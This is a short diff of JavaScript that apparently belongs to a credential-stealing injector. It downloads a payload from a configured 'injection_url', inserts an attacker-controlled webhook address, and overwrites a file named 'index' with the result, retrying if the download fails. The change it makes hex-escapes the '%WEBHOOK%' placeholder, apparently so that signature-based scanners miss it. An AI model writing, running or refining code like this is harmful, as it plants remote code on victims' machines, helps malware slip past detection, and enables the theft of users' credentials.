@@ -537,7 +537,7 @@ function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
         res.on("data", data => chunk += data)
-        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
+        res.on("end", () => fs.writeFileSync(index, chunk.replace("%\x57EBHOOK%", "${config.webhook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
 
